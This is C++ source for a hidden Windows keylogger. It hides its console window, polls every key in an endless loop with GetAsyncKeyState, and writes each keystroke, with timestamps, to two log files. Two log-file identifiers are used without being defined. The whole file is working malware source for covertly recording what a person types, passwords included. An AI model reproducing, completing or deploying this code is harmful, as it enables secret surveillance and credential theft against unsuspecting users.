#include <windows.h> 
#include <winuser.h>

#include <iostream>
#include <ctime>

using namespace std; 

int Save (int key_stroke, char *file, char *raw_file);
void AddNewSection(char * file);
void Stealth();

int main()
{
	Stealth();
	char i;

	char * file = logfile_decorated;
	char * file_raw = logfile_raw;

	AddNewSection(file);
	AddNewSection(file_raw);

	while (1)
	{
		for(i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767){
				Save (i, file, file_raw);
			}
		}
	}
	system ("PAUSE");
	return 0;
}

/* *********************************** */

int Save (int key_stroke, char *file, char *raw_file)
{
	if ( (key_stroke == 1) || (key_stroke == 2) )
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	if (key_stroke == 8){
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]"); 
	}
	else if (key_stroke == 13){
		fprintf(OUTPUT_FILE, "%s", "\n");
	}
	else if (key_stroke == 32){
		fprintf(OUTPUT_FILE, "%s", " ");
	}
	else if (key_stroke == VK_TAB) {
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	}
	else if (key_stroke == VK_SHIFT){
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	}
	else if (key_stroke == VK_CAPITAL){
		fprintf(OUTPUT_FILE, "%s", "[CAPS]");
	}
	else if (key_stroke == VK_CONTROL){
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	}
	else if (key_stroke == VK_ESCAPE){
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	}
	else if (key_stroke == VK_END){
		fprintf(OUTPUT_FILE, "%s", "[END]");
	}
	else if (key_stroke == VK_HOME){
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	}
	else if (key_stroke == VK_LEFT){
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	}
	else if (key_stroke == VK_UP){
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	}
	else if (key_stroke == VK_RIGHT){
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	}
	else if (key_stroke == VK_DOWN){
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	}
	else if (key_stroke == 190 || key_stroke == 110){
		fprintf(OUTPUT_FILE, "%s", ".");
	}
	else{
		fprintf(OUTPUT_FILE, "%c", (char)key_stroke);
	}

	fclose (OUTPUT_FILE);

	OUTPUT_FILE = fopen(raw_file, "a+");
	fprintf(OUTPUT_FILE, " %d", key_stroke);
	fclose(OUTPUT_FILE);

	return 0;
}

/* *********************************** */

void AddNewSection(char * file){
	time_t rawtime;
	struct tm * timeinfo;
	char buffer[80];

	time (&rawtime);
	timeinfo = localtime(&rawtime);

	strftime(buffer,sizeof(buffer),"%d-%m-%Y %I:%M:%S",timeinfo);


	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	fprintf(OUTPUT_FILE, "\n\n------------- start at %s-------------\n\n", buffer);
	fclose(OUTPUT_FILE);
}

/* *********************************** */

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth,0);
}